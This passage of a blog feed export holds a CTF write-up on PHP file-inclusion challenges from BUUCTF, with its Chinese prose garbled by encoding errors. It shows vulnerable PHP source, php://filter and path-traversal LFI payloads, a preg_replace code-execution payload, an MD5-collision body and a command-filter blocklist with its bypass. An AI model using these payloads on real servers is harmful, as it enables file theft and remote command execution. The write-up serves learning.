&lt;h3 id=&quot;è€ƒç‚¹&quot;&gt;è€ƒç‚¹&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Flask d
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="Python" scheme="http://ca0y1h.top/categories/CTF/Python/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”æ–‡ä»¶åŒ…å«</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2020-08-18T09:59:20.000Z</published>
    <updated>2020-09-21T08:01:00.353Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTFåˆ·é¢˜â€”â€”æ–‡ä»¶åŒ…å«">BUUCTFåˆ·é¢˜â€”â€”æ–‡ä»¶åŒ…å«</h1><h2 id="BSidesCTF2020-Had-a-bad-day">BSidesCTF2020 Had a bad day</h2><h3 id="è€ƒç‚¹">è€ƒç‚¹</h3><ul><li>LFI</li><li>PHPä¼ªåè®®</li></ul><h3 id="è§£é¢˜">è§£é¢˜</h3><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707180351.png" alt=""></p><p><code>index.php</code>æœ‰ä¸€ä¸ªå‚æ•°æ˜¯woofersï¼Œæµ‹è¯•SQLæ³¨å…¥çš„æ˜¯å‘ç°äº†includeå‡½æ•°çš„æŠ¥é”™ï¼Œç”¨PHPä¼ªåè®®è¯»å–æ–‡ä»¶</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707180515.png" alt=""></p><p>å®¡è®¡<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">        <span class="keyword">if</span>( strpos( $file, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( $file, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( $file, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">include</span> ($file . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¼ å…¥çš„<code>category</code>éœ€è¦æœ‰<code>woofers</code>,<code>meowers</code>,<code>index</code>æ‰èƒ½åŒ…å«ä¼ å…¥ä»¥ä¼ å…¥åä¸ºæ–‡ä»¶åçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•åŒ…å«flag.phpï¼Œç›´æ¥è¯•ä¸€ä¸‹åœ¨woofersåé¢åŠ <code>/../flag</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707182200.png" alt=""></p><p>ä¸Šé¢è¿™ä¸ªåº”è¯¥æ˜¯éé¢„æœŸè§£ï¼Œæˆ‘éšä¾¿è¯•ä¸€ä¸‹ç«Ÿç„¶ç›´æ¥å‡ºæ¥äº†ï¼Œè¿™ä¸ªæ€è·¯å¯ä»¥è®°ç€ã€‚</p><p>é¢„æœŸè§£çš„payloadçš„æ€è·¯æ˜¯åˆ©ç”¨php://filterä¼ªåè®®å¯ä»¥å¥—ä¸€å±‚åè®®è¯»å–<code>flag.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;index&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File">æå®¢å¤§æŒ‘æˆ˜ 2019 Secret File</h2><h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3><ul><li>ä¿¡æ¯æ³„éœ²</li><li>æ–‡ä»¶åŒ…å«</li></ul><h3 id="è§£é¢˜-v2">è§£é¢˜</h3><p>æŸ¥çœ‹æºç </p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200507093908.png" alt=""></p><p>è®¿é—®<code>Archive_room.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200507093947.png" alt=""></p><p>BurpæŠ“åŒ…</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200507094008.png" alt=""></p><p>è®¿é—®<code>secr3t.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flagæ”¾åœ¨äº†flag.phpé‡Œ</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><code>include($file)</code>æ–‡ä»¶åŒ…å«ï¼Œè€Œä¸”ä¸èƒ½ç”¨<code>input</code>ã€<code>data</code>ç­‰ä¼ªåè®®æ¥è¯»å–æ–‡ä»¶ã€‚</p><blockquote><p><a href="https://ca0y1h.top/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨æ–¹å¼</a></p></blockquote><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Include">ACTF2020 æ–°ç”Ÿèµ› Include</h2><h3 id="TODO">TODO</h3><h2 id="BJDCTF2020-ZJCTF-ä¸è¿‡å¦‚æ­¤">BJDCTF2020 ZJCTF ä¸è¿‡å¦‚æ­¤</h2><h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3><ul><li>PHPä¼ªåè®®è¯»å–æ–‡ä»¶</li><li>preg_matchå‘½ä»¤æ‰§è¡Œ</li></ul><h3 id="è§£é¢˜-v3">è§£é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾è¦ä½¿ç”¨æ–‡ä»¶åŒ…å«è¯»å–<code>next.php</code>ï¼Œpayloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;efb75f40-dbf6-4b18-ab6e-d3e05813d2bb.node3.buuoj.cn&#x2F;?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure><p>POSTï¼š<code>I have a dream</code></p><p>è§£ç å¾—åˆ°<code>next.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>]; </span><br><span class="line">$_SESSION[<span class="string">&#x27;id&#x27;</span>] = $id; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> preg_replace( <span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, $str ); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123; </span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">&quot;\n&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ¶‰åŠåˆ°<code>preg_replace()</code>å‡½æ•°çš„å‘½ä»¤æ‰§è¡Œï¼Œé™„ä¸Šåˆ†ææ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;efb75f40-dbf6-4b18-ab6e-d3e05813d2bb.node3.buuoj.cn&#x2F;next.php?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œsystemå‡½æ•°åé¢è¦åŠ åˆ†å·ã€‚</p></blockquote><h2 id="å®‰æ´µæ¯2019-easyweb">å®‰æ´µæ¯2019 easyweb</h2><h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3><ul><li>æ–‡ä»¶åŒ…å«</li></ul><h3 id="è§£é¢˜-v4">è§£é¢˜</h3><p>è¿›å…¥é¢˜ç›®ä¹‹åè§‚å¯Ÿurlï¼š<code>http://4e78d6a5-8227-41e7-95d5-6b01336c4a5c.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code>ï¼Œimgçš„å‚æ•°æ¯”è¾ƒå¯ç–‘ï¼Œç”¨base64è§£ç ä¸€æ¬¡å¾—åˆ°<code>MzUzNTM1MmU3MDZlNjc=</code>ï¼Œæ„Ÿè§‰åˆè¦base64è§£ç ä¸€æ¬¡å¾—åˆ°<code>3535352e706e67</code>ï¼Œè¿™ä¸ªå°±æ¯”è¾ƒåƒ16è¿›åˆ¶äº†ï¼Œè½¬ç åå‘ç°æ˜¯<code>555.png</code>ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶åŒ…å«ï¼Œå†™ä¸€ä¸ªpythonè„šæœ¬ç”Ÿæˆ<code>index.php</code>çš„å‚æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">filename=<span class="string">&#x27;index.php&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">hex = binascii.b2a_hex(filename)</span><br><span class="line">encode_str = base64.encode(base64.encode(hex))</span><br><span class="line">print(encode_str)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>index.php</code>çš„æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixiï½ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ­¥md5ç¢°æ’ï¼Œå’Œæˆ‘ä¹‹å‰åœ¨è¿™ç¯‡æ–‡ç« BJDCTF2020 Easy MD5è®°å½•çš„ä¸€æ ·ï¼ŒPOSTæ•°æ®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02Sj%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3E%D6%D1mE%AAL4%E1%F2d%CD%E1%073c%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F_D%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%3C%F9%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%90%BC%B5%2F%ED&amp;b&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02S%EA%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3EV%D2mE%AAL4%E1%F2d%CD%E1%073%E3%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F%DFD%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%BC%F8%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%10%BC%B5%2F%ED</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥å°±æ˜¯ç»•è¿‡è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œéœ€è¦FUZZ Linuxå‘½ä»¤å»æ‰§è¡Œè¯»å–æ–‡ä»¶ï¼Œè¿™é‡Œæä¾›ä¸¤ä¸ªå‘½ä»¤ï¼š<code>sort</code>å’Œ<code>strings</code>ã€‚</p><p>å¦å¤–ï¼Œè¿‡æ»¤åæ–œæ  <code>|\\|\\\\|</code>çš„è¿™ä¸¤ä¸ªæ­£åˆ™æ²¡æœ‰å†™å¥½ï¼Œå¯¼è‡´äº†åæ–œæ çš„é€ƒé€¸ï¼Œç›´æ¥ç”¨<code>ca\t</code>å‘½ä»¤ã€‚</p><blockquote><p>å…³äºè¿™ä¸ªåæ–œæ é€ƒé€¸æˆ‘æ˜¯çœŸçš„æ²¡å¤ªçœ‹æ‡‚ã€‚ã€‚ã€‚</p></blockquote><h2 id="BJDCTF2nd-æ–‡ä»¶æ¢æµ‹">BJDCTF2nd æ–‡ä»¶æ¢æµ‹</h2><h3 id="è€ƒç‚¹-v5">è€ƒç‚¹</h3><ul><li>æ–‡ä»¶åŒ…å«</li><li>SSRF</li><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li><li>Sessionç»•è¿‡</li></ul><h3 id="è§£é¢˜-v5">è§£é¢˜</h3><p>æŸ¥çœ‹HTTPè¿”å›å¤´å‘ç°æœ‰ä¸€ä¸ªHintï¼š<code>home.php</code>ï¼Œè®¿é—®åè§‚å¯Ÿurl</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712115335.png" alt=""></p><p>fileå‚æ•°æ˜¯ä¸€ä¸ªæ–‡ä»¶åï¼Œç”¨phpä¼ªåè®®å°è¯•æ–‡ä»¶åŒ…å«</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712115431.png" alt=""></p><p><code>home.php</code>æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">&quot;y1ng&quot;</span>, sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)), time() + <span class="number">3600</span>);</span><br><span class="line">setcookie(<span class="string">&#x27;your_ip_address&#x27;</span>, md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), time()+<span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/\^|\~|&amp;|\|/&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;forbidden&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?a.?d.?m.?i.?n.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;You! are! not! my! admin!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ç¦æ­¢å¥—å¨ƒ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/system$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">            $file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ç°åœ¨è®¿é—®çš„æ˜¯ &quot;</span>.$file . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">require</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;./home.php?file=system&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„æ–¹å¼å¯ä»¥è¯»å–<code>system.php</code>æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 